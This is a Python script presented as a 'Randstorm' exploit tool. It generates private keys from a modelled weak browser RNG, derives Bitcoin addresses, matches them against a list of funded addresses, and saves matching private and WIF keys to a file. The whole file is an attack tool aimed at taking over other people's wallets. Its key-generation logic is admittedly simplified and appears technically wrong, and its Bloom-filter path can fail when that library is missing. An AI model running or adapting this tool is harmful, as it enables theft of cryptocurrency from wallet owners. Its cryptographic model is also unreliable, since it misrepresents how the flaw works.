#!/usr/bin/env python3
# Randstorm Exploit for BitcoinJS Wallets
# This tool targets wallets created with BitcoinJS between 2011-2015 that are vulnerable to the Randstorm vulnerability
# Based on the Plutus Bitcoin Brute Forcer by Isaac Delly

import platform
import multiprocessing
from multiprocessing import Pool, Manager, Value, Lock
import hashlib
import binascii
import os
import sys
import time
import concurrent.futures
import itertools
import mmap
import psutil
import tqdm
import struct
import datetime
import random
from typing import List, Tuple, Set, Dict, Optional, Union

# Import the fastest available cryptography library
try:
    # First choice: coincurve (very fast and reliable)
    import coincurve
    CRYPTO_LIB = "coincurve"
except ImportError:
    try:
        # Second choice: fastecdsa (slower)
        from fastecdsa import keys, curve
        CRYPTO_LIB = "fastecdsa"
    except ImportError:
        try:
            # Third choice: starkbank-ecdsa (can be fastest but less reliable)
            from ellipticcurve.privateKey import PrivateKey
            from ellipticcurve.curve import secp256k1
            CRYPTO_LIB = "starkbank"
        except ImportError:
            print("ERROR: No ECC library found. Install one of: coincurve, fastecdsa, or starkbank-ecdsa")
            sys.exit(1)

# Try to import Bloom filter for faster lookups
try:
    from pybloom_live import ScalableBloomFilter
    BLOOM_FILTER_AVAILABLE = True
except ImportError:
    BLOOM_FILTER_AVAILABLE = False

print(f"Using {CRYPTO_LIB} cryptography library")
if BLOOM_FILTER_AVAILABLE:
    print("Bloom filter support available (faster lookups)")
else:
    print("Bloom filter not available. Install pybloom-live for faster lookups")

DATABASE = r'database/'

# Use a batch size for generating multiple keys at once
BATCH_SIZE = 500

# Memory usage monitoring
def get_memory_usage():
    """Return the memory usage in MB"""
    process = psutil.Process(os.getpid())
    mem_info = process.memory_info()
    return mem_info.rss / 1024 / 1024  # Convert to MB

# BitcoinJS Randstorm vulnerability constants
# The vulnerability is in the SecureRandom() function in JSBN library
# which was used by BitcoinJS until March 2014
RANDSTORM_START_DATE = datetime.datetime(2011, 5, 1)  # First BitcoinJS commit
RANDSTORM_END_DATE = datetime.datetime(2015, 12, 31)  # Latest observed vulnerable wallets

# Browser-specific LCG parameters for Math.random() implementations
# These were the problematic RNGs used in browsers during the vulnerable period
BROWSER_LCGS = {
    # Chrome V8 (pre-2015)
    "chrome": {
        "multiplier": 0x41c64e6d,
        "increment": 0x3039,
        "modulus": 2**32,
        "shift_bits": 0
    },
    # Firefox SpiderMonkey (pre-2015)
    "firefox": {
        "multiplier": 0x5DEECE66D,
        "increment": 0xB,
        "modulus": 2**48,
        "shift_bits": 16
    },
    # Safari JavaScriptCore (pre-2015)
    "safari": {
        "multiplier": 0x41c64e6d,
        "increment": 0x3039,
        "modulus": 2**32,
        "shift_bits": 0
    }
}

def is_potential_randstorm_address(address: str) -> bool:
    """
    Check if an address has characteristics of being generated during the Randstorm vulnerable period.
    This is a heuristic check and not definitive.
    
    Args:
        address: Bitcoin address to check
        
    Returns:
        bool: True if the address might be vulnerable to Randstorm
    """
    # This is a simplified check - in a real implementation, you would use more sophisticated
    # heuristics based on the patterns of addresses generated by BitcoinJS during the vulnerable period
    
    # For now, we'll just check if it's a P2PKH address (starts with '1')
    # In a real implementation, you would analyze the address structure more deeply
    return address.startswith('1')

def generate_randstorm_candidates(timestamp_range: Tuple[int, int], browser: str, count: int = 100) -> List[str]:
    """
    Generate private key candidates that could have been created by BitcoinJS during the Randstorm vulnerable period.
    
    Args:
        timestamp_range: Tuple of (start_timestamp, end_timestamp) to consider
        browser: Browser type to simulate ('chrome', 'firefox', 'safari')
        count: Number of candidates to generate
        
    Returns:
        List of private key hex strings
    """
    if browser not in BROWSER_LCGS:
        raise ValueError(f"Unknown browser: {browser}. Supported browsers: {list(BROWSER_LCGS.keys())}")
    
    lcg_params = BROWSER_LCGS[browser]
    start_time, end_time = timestamp_range
    
    candidates = []
    for _ in range(count):
        # Simulate a timestamp from the vulnerable period
        timestamp_ms = random.randint(start_time, end_time)
        
        # Simulate the weak RNG state based on the timestamp
        # This is a simplified model of how BitcoinJS would have generated keys
        # In a real implementation, you would need to model the exact behavior of the SecureRandom function
        rng_state = timestamp_ms & 0xFFFFFFFF  # Initial seed from timestamp
        
        # Apply the LCG algorithm used by the browser's Math.random()
        for _ in range(10):  # Simulate multiple calls to Math.random()
            rng_state = (lcg_params["multiplier"] * rng_state + lcg_params["increment"]) % lcg_params["modulus"]
        
        # Generate a private key from the predictable RNG state
        # In a real implementation, you would need to model exactly how BitcoinJS used the RNG output
        private_key = format(rng_state, '064x').upper()
        candidates.append(private_key)
    
    return candidates

def private_key_to_public_key(private_key, _unused=None):
    """Convert private key to public key using the fastest available library"""
    try:
        if CRYPTO_LIB == "coincurve":
            # Coincurve (very fast and reliable)
            private_key_bytes = bytes.fromhex(private_key)
            public_key = coincurve.PublicKey.from_secret(private_key_bytes)
            return '04' + public_key.format(compressed=False)[1:].hex().upper()
        elif CRYPTO_LIB == "fastecdsa":
            # Fastecdsa (slower)
            key = keys.get_public_key(int('0x' + private_key, 0), curve.secp256k1)
            return '04' + (hex(key.x)[2:] + hex(key.y)[2:]).zfill(128)
        else:
            # Starkbank-ecdsa
            pk_int = int(private_key, 16)
            pk = PrivateKey(pk_int, curve=secp256k1)
            return '04' + pk.publicKey().toString().hex().upper()
    except Exception as e:
        # Fall back to fastecdsa as last resort
        if 'fastecdsa' in sys.modules:
            key = keys.get_public_key(int('0x' + private_key, 0), curve.secp256k1)
            return '04' + (hex(key.x)[2:] + hex(key.y)[2:]).zfill(128)
        else:
            raise Exception(f"Failed to generate public key: {e}")

def public_key_to_address(public_key):
    """Convert public key to Bitcoin address"""
    output = []
    alphabet = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    var = hashlib.new('ripemd160')
    encoding = binascii.unhexlify(public_key.encode())
    var.update(hashlib.sha256(encoding).digest())
    var_encoded = ('00' + var.hexdigest()).encode()
    digest = hashlib.sha256(binascii.unhexlify(var_encoded)).digest()
    var_hex = '00' + var.hexdigest() + hashlib.sha256(digest).hexdigest()[0:8]
    count = [char != '0' for char in var_hex].index(True) // 2
    n = int(var_hex, 16)
    while n > 0:
        n, remainder = divmod(n, 58)
        output.append(alphabet[remainder])
    for i in range(count): output.append(alphabet[0])
    return ''.join(output[::-1])

def private_key_to_wif(private_key):
    """Convert private key to WIF format"""
    digest = hashlib.sha256(binascii.unhexlify('80' + private_key)).hexdigest()
    var = hashlib.sha256(binascii.unhexlify(digest)).hexdigest()
    var = binascii.unhexlify('80' + private_key + var[0:8])
    alphabet = chars = '123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
    value = pad = 0
    result = ''
    for i, c in enumerate(var[::-1]): value += 256**i * c
    while value >= len(alphabet):
        div, mod = divmod(value, len(alphabet))
        result, value = chars[mod] + result, div
    result = chars[value] + result
    for c in var:
        if c == 0: pad += 1
        else: break
    return chars[0] * pad + result

def process_randstorm_batch(args):
    """Process a batch of potential Randstorm-vulnerable keys and check against the database"""
    database, config, batch_size, browser = args
    found_addresses = []
    
    # Get timestamp range for the vulnerable period
    start_timestamp = int(RANDSTORM_START_DATE.timestamp() * 1000)
    end_timestamp = int(RANDSTORM_END_DATE.timestamp() * 1000)
    
    # Generate a batch of private keys that could have been created during the vulnerable period
    private_keys = generate_randstorm_candidates((start_timestamp, end_timestamp), browser, batch_size)
    
    # Process keys in parallel using a thread pool
    with concurrent.futures.ThreadPoolExecutor(max_workers=min(8, os.cpu_count())) as executor:
        # Create public keys in parallel
        public_keys = list(executor.map(
            lambda pk: private_key_to_public_key(pk, config['fastecdsa']), 
            private_keys
        ))
        
        # Create addresses in parallel
        addresses = list(executor.map(public_key_to_address, public_keys))
    
    # Check addresses against database
    for i, address in enumerate(addresses):
        if config['verbose']:
            print(address)
        
        # First check if this looks like a potentially vulnerable address
        if not is_potential_randstorm_address(address):
            continue
        
        # Check if using bloom filter or set
        if isinstance(database, ScalableBloomFilter):
            # Use bloom filter for fast lookup
            if address[-config['substring']:] in database:
                # Verify the full address in the database files (bloom filter can have false positives)
                found = verify_address_in_database(address, config['substring'])
                if found:
                    found_addresses.append((private_keys[i], public_keys[i], address))
                    save_found_address(private_keys[i], public_keys[i], address)
        else:
            # Use set for lookup
            if address[-config['substring']:] in database:
                # Verify the full address in the database files
                found = verify_address_in_database(address, config['substring'])
                if found:
                    found_addresses.append((private_keys[i], public_keys[i], address))
                    save_found_address(private_keys[i], public_keys[i], address)
    
    return found_addresses

def verify_address_in_database(address, substring_length):
    """Verify if the full address exists in any database file using binary search"""
    suffix = address[-substring_length:]
    
    # Only check files if the suffix matches
    for filename in os.listdir(DATABASE):
        file_path = os.path.join(DATABASE, filename)
        
        # Use memory mapping for faster file searching
        try:
            with open(file_path, 'r') as f:
                # First check if the file contains the address using a faster method
                # Read the file in chunks and check for the address
                chunk_size = 1024 * 1024  # 1MB chunks
                
                # Read the file in chunks for better memory efficiency
                while True:
                    chunk = f.read(chunk_size)
                    if not chunk:
                        break
                        
                    # If the address is in this chunk, do a more detailed search
                    if address in chunk:
                        # Go back to the beginning of the file for a line-by-line search
                        f.seek(0)
                        for line in f:
                            if address == line.strip():
                                return True
                        break
        except Exception as e:
            print(f"Error checking file {file_path}: {e}")
    
    return False

def save_found_address(private_key, public_key, address):
    """Save found address information to plutus.txt"""
    with open('plutus.txt', 'a') as plutus:
        plutus.write('hex private key: ' + str(private_key) + '\n' +
                     'WIF private key: ' + str(private_key_to_wif(private_key)) + '\n' +
                     'public key: ' + str(public_key) + '\n' +
                     'uncompressed address: ' + str(address) + '\n\n')
    
    # Also print to console for immediate notification
    print("\n" * 50)
    print(f"FOUND RANDSTORM VULNERABLE ADDRESS WITH BALANCE: {address}")
    print("=" * 50 + "\n")

def main(database, args):
    """Main function that processes batches of keys in parallel"""
    # Create a thread pool for concurrent processing
    with concurrent.futures.ThreadPoolExecutor(max_workers=args['cpu_count']) as executor:
        # Process batches of keys for each browser type
        browsers = list(BROWSER_LCGS.keys())
        
        # Track statistics
        start_time = time.time()
        total_addresses = 0
        last_report_time = start_time
        report_interval = 10  # Report every 10 seconds
        
        print(f"Starting Randstorm exploit with {args['cpu_count']} workers, batch size {BATCH_SIZE}")
        print(f"Targeting vulnerable BitcoinJS wallets created between {RANDSTORM_START_DATE.year}-{RANDSTORM_END_DATE.year}")
        print(f"Memory usage at start: {get_memory_usage():.2f} MB")
        
        while True:
            # Cycle through browser types to simulate different Math.random() implementations
            for browser in browsers:
                print(f"Trying {browser.capitalize()} browser Math.random() implementation...")
                
                # Submit batch processing tasks
                batch_args = [(database, args, BATCH_SIZE, browser) for _ in range(args['cpu_count'])]
                futures = [executor.submit(process_randstorm_batch, arg) for arg in batch_args]
                
                # Wait for all tasks to complete
                for future in concurrent.futures.as_completed(futures):
                    found_addresses = future.result()
                    total_addresses += BATCH_SIZE * args['cpu_count']
                    
                    # Report statistics periodically
                    current_time = time.time()
                    if current_time - last_report_time > report_interval:
                        elapsed = current_time - start_time
                        addresses_per_second = total_addresses / elapsed
                        print(f"Processed {total_addresses:,} addresses in {elapsed:.1f} seconds ({addresses_per_second:.1f} addr/sec)")
                        print(f"Memory usage: {get_memory_usage():.2f} MB")
                        last_report_time = current_time

def load_database_efficiently(database_dir, substring_length, use_bloom=False, max_files_at_once=5):
    """
    Load database more efficiently with reduced memory usage by processing multiple files.
    
    Args:
        database_dir (str): Directory containing database files
        substring_length (int): Number of characters to keep from the end of each address
        use_bloom (bool): Flag for Bloom filter usage (not implemented)
        max_files_at_once (int): Maximum number of files to process simultaneously
    
    Returns:
        set: Set of address substrings
        int: Total number of addresses processed
    """
    import os
    from tqdm import tqdm
    
    print('Reading database files...')
    
    # Use a set for all addresses
    database = set()
    total_addresses = 0
    
    # Get all database files (only .txt files)
    file_paths = [os.path.join(database_dir, filename) for filename in os.listdir(database_dir) 
                 if filename.endswith('.txt')]
    
    # Show progress bar
    with tqdm(total=len(file_paths), desc="Loading database") as pbar:
        # Process files in smaller batches to reduce memory usage
        for i in range(0, len(file_paths), max_files_at_once):
            batch = file_paths[i:i+max_files_at_once]
            
            # Process this batch of files
            for file_path in batch:
                file_total = 0
                try:
                    with open(file_path, 'r') as file:
                        # Process the file line by line to minimize memory usage
                        for line in file:
                            address = line.strip()
                            if address and address.startswith('1'):  # Only process P2PKH addresses
                                database.add(address[-substring_length:])
                                file_total += 1
                                total_addresses += 1
                except Exception as e:
                    print(f"Error processing {file_path}: {e}")
                
                pbar.update(1)
    
    print(f'DONE - Loaded {total_addresses:,} addresses into database')
    print(f'Memory usage after loading: {get_memory_usage():.2f} MB')
    return database, total_addresses

def print_help():
    """Print help information"""
    print("""
Randstorm Exploit for BitcoinJS Wallets
---------------------------------------
This tool targets wallets created with BitcoinJS between 2011-2015 that are vulnerable to the Randstorm vulnerability.

Usage:
  python3 randstorm_exploit.py [options]

Options:
  help                    Show this help message
  verbose=0|1            Print addresses (0=silent, 1=verbose)
  substring=1-26         Address suffix length for memory efficiency
  cpu_count=N            CPU cores to use
  batch_size=N           Addresses per batch (default: 500)
  use_bloom=0|1          Use bloom filter for faster lookups (requires pybloom-live)
    """)

if __name__ == '__main__':
    args = {
        'verbose': 0,
        'substring': 8,
        'fastecdsa': platform.system() in ['Linux', 'Darwin'],
        'cpu_count': multiprocessing.cpu_count(),
        'batch_size': BATCH_SIZE,
        'use_bloom': BLOOM_FILTER_AVAILABLE,
    }
    
    # Parse command line arguments
    for arg in sys.argv[1:]:
        if '=' in arg:
            command, value = arg.split('=', 1)
        else:
            command, value = arg, None
            
        if command == 'help':
            print_help()
            sys.exit(0)
        elif command == 'cpu_count' and value:
            cpu_count = int(value)
            if cpu_count > 0 and cpu_count <= multiprocessing.cpu_count():
                args['cpu_count'] = cpu_count
            else:
                print(f'Invalid input. cpu_count must be greater than 0 and less than or equal to {multiprocessing.cpu_count()}')
                sys.exit(-1)
        elif command == 'verbose' and value:
            if value in ['0', '1']:
                args['verbose'] = int(value)
            else:
                print('Invalid input. verbose must be 0(false) or 1(true)')
                sys.exit(-1)
        elif command == 'substring' and value:
            substring = int(value)
            if substring > 0 and substring < 27:
                args['substring'] = substring
            else:
                print('Invalid input. substring must be greater than 0 and less than 27')
                sys.exit(-1)
        elif command == 'batch_size' and value:
            batch_size = int(value)
            if batch_size > 0:
                args['batch_size'] = batch_size
                # Update the module-level batch size
                BATCH_SIZE = batch_size
            else:
                print('Invalid input. batch_size must be greater than 0')
                sys.exit(-1)
        elif command == 'use_bloom' and value:
            if value in ['0', '1']:
                use_bloom = int(value) == 1
                if use_bloom and not BLOOM_FILTER_AVAILABLE:
                    print('Warning: Bloom filter requested but pybloom-live is not installed.')
                    print('Install with: pip install pybloom-live')
                    args['use_bloom'] = False
                else:
                    args['use_bloom'] = use_bloom
            else:
                print('Invalid input. use_bloom must be 0(false) or 1(true)')
                sys.exit(-1)
        else:
            print(f'Invalid input: {command}\nRun `python3 randstorm_exploit.py help` for help')
            sys.exit(-1)
    
    # Print system information
    print(f"Python version: {platform.python_version()}")
    print(f"System: {platform.system()} {platform.release()}")
    print(f"CPU cores: {multiprocessing.cpu_count()}")
    print(f"Initial memory usage: {get_memory_usage():.2f} MB")
    
    # Load the database efficiently
    database, total_addresses = load_database_efficiently(DATABASE, args['substring'])
    
    print(f'Database size: {len(database):,} unique suffixes')
    print(f'Batch size: {args["batch_size"]} addresses per batch')
    print(f'Processes spawned: {args["cpu_count"]}')
    print(f'Targeting BitcoinJS wallets vulnerable to Randstorm (2011-2015)')
    
    # Start the main process
    main(database, args)

